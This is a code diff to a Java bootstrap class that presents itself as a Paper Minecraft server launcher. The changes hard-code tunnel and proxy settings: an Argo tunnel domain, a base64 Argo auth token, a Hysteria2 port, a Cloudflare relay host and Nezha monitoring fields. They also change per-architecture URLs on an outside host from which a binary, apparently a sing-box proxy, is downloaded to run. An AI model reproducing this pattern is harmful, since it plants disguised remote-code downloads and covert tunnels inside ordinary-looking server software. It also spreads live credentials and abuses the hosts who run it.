@@ -62,20 +62,33 @@ public final class PaperBootstrap {
             Main.main(options);
             
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
     }
 
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
             } else {
-                System.out.print("\033[H\033[2J");
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                
+                new ProcessBuilder("tput", "reset")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+                
+                System.out.print("\033[8;30;120t");
                 System.out.flush();
             }
         } catch (Exception e) {
-            // Ignore exceptions
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
         }
     }
     
@@ -92,23 +105,23 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "0eabf83f-de21-4156-97d3-8fa5aedd9d86");
-        envVars.put("FILE_PATH", "./");
+        envVars.put("UUID", "9bfa13cc-fe9f-41bf-84ce-105af9bc1e29");
+        envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "databrick-us.wkuu.dpdns.org");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZWU5ZGY5ZmU5YmEzZmJhZDQ0ODMyZDNkZWU0OTlhNWMiLCJ0IjoiMmI4ZjE0ZTYtMTA4Yi00MTc4LThmOTMtNTU2N2M1MGJjODcwIiwicyI6IllUUmhOekE1TXpRdFpEYzJZUzAwWldaaExXSXdNakl0TlRJek1EbGtOemxoTXpKaSJ9");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "mc-servers.8.9.d.b.0.d.0.0.1.0.a.2.ip6.arpa");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZWU5ZGY5ZmU5YmEzZmJhZDQ0ODMyZDNkZWU0OTlhNWMiLCJ0IjoiOWQ0ZmI3NmItODZjZC00NmE1LWEyYjItN2I2ZDQzOTVlYjAxIiwicyI6IlpUSmxNV1F6WldNdFl6YzRaaTAwTTJObExUaGhNemd0T0RjeVltVTVNR05tTW1SaSJ9");
         envVars.put("HY2_PORT", "36396");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "myMCServer");
+        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "Zhaocharlie'sMc-Servers");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -146,11 +159,11 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
